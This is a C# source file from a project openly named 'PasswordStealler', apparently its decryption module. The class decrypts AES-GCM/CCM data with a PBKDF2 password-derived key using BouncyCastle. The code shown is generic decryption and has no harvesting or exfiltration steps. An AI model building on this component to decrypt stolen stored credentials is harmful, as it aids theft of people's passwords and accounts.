using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using PasswordStealler.Decryption;
using PasswordStealler.Factories;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace PasswordStealler.Decryprion
{
    public class AeadDecryptor : ICryptographyProvider
    {
        protected virtual int NonceBitSize { get; set; } = 128;
        protected virtual int MacBitSize { get; set; } = 128;
        protected virtual int KeyBitSize { get; set; } = 256;

        private readonly IAeadBlockCipher _aeadBlockCipher;
        private readonly Encoding _encoding;

        //Preconfigured Password Key Derivation Parameters
        protected virtual int SaltBitSize { get; set; } = 128;
        public virtual int KeyDerivationIterations { get; set; } = 1000;

        public int BlockSizeInBytes
        {
            get { return _aeadBlockCipher.GetBlockSize(); }
        }

        public BlockCipherEngines CipherEngine
        {
            get
            {
                string cipherEngine = _aeadBlockCipher.AlgorithmName.Split('/')[0];
                return (BlockCipherEngines)Enum.Parse(typeof(BlockCipherEngines), cipherEngine);
            }
        }

        public BlockCipherModes CipherMode
        {
            get
            {
                string cipherMode = _aeadBlockCipher.AlgorithmName.Split('/')[1];
                return (BlockCipherModes)Enum.Parse(typeof(BlockCipherModes), cipherMode);
            }
        }

        public AeadDecryptor()
        {
            _aeadBlockCipher = new GcmBlockCipher(new AesEngine());
            _encoding = Encoding.UTF8;
        }

        public AeadDecryptor(Encoding encoding)
        {
            _aeadBlockCipher = new GcmBlockCipher(new AesEngine());
            _encoding = encoding;
        }

        public AeadDecryptor(IAeadBlockCipher aeadBlockCipher)
        {
            _aeadBlockCipher = aeadBlockCipher;
            _encoding = Encoding.UTF8;
            SetNonceForCcm();
        }

        private void SetNonceForCcm()
        {
            if (_aeadBlockCipher is CcmBlockCipher)
                NonceBitSize = 88;
        }

        public string Decrypt(string cipherText, SecureString decryptionKey)
        {
            return SimpleDecryptWithPassword(cipherText, decryptionKey);
        }

        private string SimpleDecryptWithPassword(string encryptedMessage, SecureString decryptionKey, int nonSecretPayloadLength = 0)
        {
            if (string.IsNullOrWhiteSpace(encryptedMessage))
                return "";

            try
            {
                byte[] cipherText = Convert.FromBase64String(encryptedMessage);
                byte[] plainText = SimpleDecryptWithPassword(cipherText, decryptionKey.ConvertToUnsecureString(), nonSecretPayloadLength);
                return plainText == null ? null : _encoding.GetString(plainText);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Decryption failed: {ex.Message}");
                return null;
            }
        }

        private byte[] SimpleDecryptWithPassword(byte[] encryptedMessage, string password, int nonSecretPayloadLength = 0)
        {
  
            byte[] salt = new byte[SaltBitSize / 8];
            Array.Copy(encryptedMessage, nonSecretPayloadLength, salt, 0, salt.Length);


            Pkcs5S2KeyGenerator keyDerivationFunction = new(KeyBitSize, KeyDerivationIterations);
            byte[] key = keyDerivationFunction.DeriveKey(password, salt);
            return SimpleDecrypt(encryptedMessage, key, salt.Length + nonSecretPayloadLength);
        }

        private byte[] SimpleDecrypt(byte[] encryptedMessage, byte[] key, int nonSecretPayloadLength = 0)
        {
            using MemoryStream cipherStream = new MemoryStream(encryptedMessage);
            using BinaryReader cipherReader = new BinaryReader(cipherStream);

            //Grab Payload
            byte[] nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);

            //Grab Nonce
            byte[] nonce = cipherReader.ReadBytes(NonceBitSize / 8);

            //Grab Cipher Text
            byte[] cipherText = cipherReader.ReadBytes(encryptedMessage.Length - nonSecretPayloadLength - nonce.Length);

            AeadParameters parameters = new AeadParameters(new KeyParameter(key), MacBitSize, nonce, nonSecretPayload);
            _aeadBlockCipher.Init(false, parameters);

            byte[] plainText = new byte[_aeadBlockCipher.GetOutputSize(cipherText.Length)];

            try
            {
                int len = _aeadBlockCipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                _aeadBlockCipher.DoFinal(plainText, len);

                // Remove padding if any
                return RemovePadding(plainText);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Decryption error: {ex.Message}");
                return null;
            }
        }

        private byte[] RemovePadding(byte[] data)
        {
            // Remove null bytes at the end
            int endIndex = data.Length - 1;
            while (endIndex >= 0 && data[endIndex] == 0)
                endIndex--;

            if (endIndex < 0) return new byte[0];

            byte[] result = new byte[endIndex + 1];
            Array.Copy(data, result, endIndex + 1);
            return result;
        }
    }
}

